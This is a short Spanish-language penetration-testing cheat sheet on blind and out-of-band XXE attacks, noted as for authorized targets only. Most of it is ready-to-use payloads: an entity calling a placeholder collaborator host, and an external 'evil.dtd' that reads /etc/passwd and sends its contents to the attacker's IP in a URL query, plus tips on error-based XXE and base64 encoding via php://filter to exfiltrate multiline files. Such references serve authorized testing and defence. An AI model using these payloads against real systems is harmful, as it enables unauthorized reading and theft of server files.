# XXE ciego / OOB

Ver índice: [xxe.md](xxe.md). **Solo sobre objetivos autorizados.** Cuando el parser procesa entidades pero no refleja el resultado.

## Confirmación (interacción OOB)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://TU-COLLABORATOR/"> ]>
<foo>&xxe;</foo>
```
Si recibes la petición entrante, hay XXE aunque no veas nada en la respuesta.

## Exfiltración con DTD externa

Petición:
```xml
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://TU-IP/evil.dtd"> %ext; ]>
<foo>x</foo>
```
`evil.dtd` en tu servidor:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TU-IP/?x=%file;'>">
%eval;
%exfil;
```
El contenido del fichero llega en la query de tu servidor.

## XXE basado en errores

Si hay errores verbosos, provoca que el mensaje de error incluya el contenido del fichero (referenciando una entidad a una ruta inexistente que concatene `%file;`).

## Notas

- Ficheros multilínea complican la exfil por HTTP; usa `php://filter` (base64) para “aplanarlos”.
- Ideal cuando el endpoint devuelve 200 sin cuerpo útil.
